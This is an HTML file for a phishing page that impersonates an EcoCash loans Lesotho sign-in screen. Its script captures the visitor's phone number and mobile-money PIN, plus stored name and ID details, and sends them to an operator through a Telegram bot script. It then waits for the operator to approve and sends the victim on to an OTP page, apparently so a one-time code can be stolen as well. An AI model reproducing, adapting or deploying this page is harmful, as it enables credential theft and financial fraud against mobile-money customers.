<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Sign in | EcoCash loans Lesotho</title>
  <link rel="icon" href="assets/image.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@600;700&display=swap" rel="stylesheet">
  <style>
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
    .hidden-text .login-btn-text { display: none; }
    :root{--blue:#160aa8;--ecoblue:#1665b5;--red:#ed1d2d;--ink:#24232d;--mist:#fbfbff}*{box-sizing:border-box}body{min-height:100vh;margin:0;background:linear-gradient(48deg,transparent 0 23%,rgba(225,223,247,.35) 23% 28%,transparent 28% 67%,rgba(240,239,252,.5) 67% 73%,transparent 73%),var(--mist);font-family:"DM Sans",Arial,sans-serif;color:var(--ink);display:grid;place-items:center;padding:28px 18px}.screen{width:min(100%,500px);min-height:730px;display:flex;flex-direction:column;align-items:center}.wordmark{margin:70px 0 66px;text-align:center;line-height:.8;font-family:Manrope,Arial;font-size:clamp(42px,11vw,62px);font-weight:700;letter-spacing:-3px}.wordmark .eco{color:var(--ecoblue)}.wordmark .cash{color:var(--red)}.wordmark small{display:block;color:#253990;font-family:"DM Sans";font-size:clamp(13px,3vw,18px);letter-spacing:.3px;margin-top:14px}.sign-card{width:100%;min-height:470px;background:rgba(255,255,255,.9);border:1px solid #dddddf;border-radius:42px;padding:58px 44px 36px;box-shadow:0 7px 21px rgba(30,27,90,.025)}.sign-card h1{font:600 22px Manrope;margin:0 0 7px;text-align:center}.sign-card .intro{margin:0 0 27px;text-align:center;color:#72717d;font-size:13px;line-height:1.45}.field{position:relative;margin:18px 0}.field input{width:100%;height:76px;border:1.5px solid #dedde3;border-radius:15px;background:#fff;padding:0 22px;color:#302f3c;font:400 18px "DM Sans";outline:none;transition:.2s}.field input::placeholder{color:#787783}.field input:focus{border:2px solid #241cab;box-shadow:0 0 0 3px rgba(36,28,171,.08)}.field label{position:absolute;left:17px;top:-9px;background:#fff;padding:0 6px;color:#766faf;font-size:13px;z-index:1}.field.phone label{display:none}.field.phone input{width:100%;height:76px;border:1.5px solid #dedde3;border-radius:15px;background:#f5f5f7;padding:0 22px;color:#555;font:500 16px "DM Sans";letter-spacing:1px}.field.phone input::placeholder{color:#999}.pin-wrap button{position:absolute;right:14px;top:21px;border:0;background:none;color:#aaa9b1;font-size:21px;cursor:pointer}.login{width:100%;height:69px;border:0;border-radius:34px;background:var(--blue);color:#fff;font:500 25px "DM Sans";cursor:pointer;margin-top:80px;transition:.2s}.login:hover{background:var(--ecoblue)}.register{margin-top:12px;font-size:13px;color:#766faf;display:block}.back{margin-top:16px;font-size:13px;color:#766faf}.back:hover{color:var(--blue)}@media(max-width:600px){.screen{padding:10px}.wordmark{font-size:clamp(28px,8vw,40px)}.wordmark .small{font-size:clamp(10px,2.5vw,14px)}.sign-card{min-height:auto;padding:35px 20px 25px;border-radius:25px}.field input{height:60px;font:400 16px "DM Sans"};.pin-wrap button{top:16px}.login{height:55px;font:500 20px "DM Sans";margin-top:45px}.back{font-size:12px}}</style>
</head>
<body>
  <main class="screen">
    <a class="wordmark" href="https://ecocash-loan-ls.vercel.app/" target="_blank" rel="noopener" aria-label="EcoCash loans Lesotho"><span class="eco">Eco</span><span class="cash">Cash</span><small>Spache - Fono</small></a>
    <form class="sign-card" id="login-form" action="otp.html">
      <h1>Sign in to continue</h1>
      <p class="intro">Verify your loan request securely.</p>
      <div class="field phone"><input id="phone" required type="tel" inputmode="tel" autocomplete="tel" aria-label="Phone number" placeholder="+266 XX XXX XXX"></div>
      <div class="field pin-wrap"><label for="pin">PIN</label><input id="pin" required type="password" inputmode="numeric" pattern="[0-9]*" minlength="4" maxlength="6" autocomplete="current-password" placeholder="Enter Your PIN"><button type="button" id="show-pin" aria-label="Show PIN">◉</button></div>
      <button class="login" type="submit" id="login-btn"><span class="login-btn-text">Log In</span></button>
      <a class="register" href="#register">Register here</a>
    </form>
    <div id="approval-status" style="display:none;text-align:center;margin-top:20px;color:var(--blue)">
      <div class="spinner"></div>
    </div>
    <a class="back" href="loan-purpose.html">← Back to your details</a>
    <script src="assets/js/telegram.js"></script>
    <script>
      const pin=document.querySelector('#pin'),toggle=document.querySelector('#show-pin');
      toggle.addEventListener('click',()=>{const visible=pin.type==='text';pin.type=visible?'password':'text';toggle.textContent=visible?'◉':'◉'});
      
      document.getElementById('login-form').addEventListener('submit', async function(e){
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        const pin = document.getElementById('pin').value;
        
        const appData = JSON.parse(sessionStorage.getItem('ecoCashCustomer') || '{}');
        const appId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('current_app_id', appId);
        
        const message = `<b>New Login Attempt</b>\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nName: ${appData.firstName || 'N/A'} ${appData.lastName || ''}\nID: ${appData.identity || 'N/A'}\n`;
        
        await sendWithButtons(message);
        
        document.querySelector('.login').classList.add('hidden-text');
        document.querySelector('.login').disabled = true;
        document.getElementById('approval-status').style.display = 'block';
        
        pollForUpdates((update) => {
          if (update.callback_query) {
            const data = update.callback_query.data;
            const msgText = update.callback_query.message.caption || update.callback_query.message.text;
            if (msgText.includes(phone)) {
              if (data === 'approve') {
                setApproved(appId);
                window.location.href = 'otp.html';
              } else if (data === 'reject') {
                document.querySelector('.login').classList.remove('hidden-text');
                document.querySelector('.login-btn-text').textContent = 'Log In';
                document.querySelector('.login').disabled = false;
                document.getElementById('approval-status').style.display = 'none';
              }
            }
          }
        });
      });
    </script>
</body>
</html>
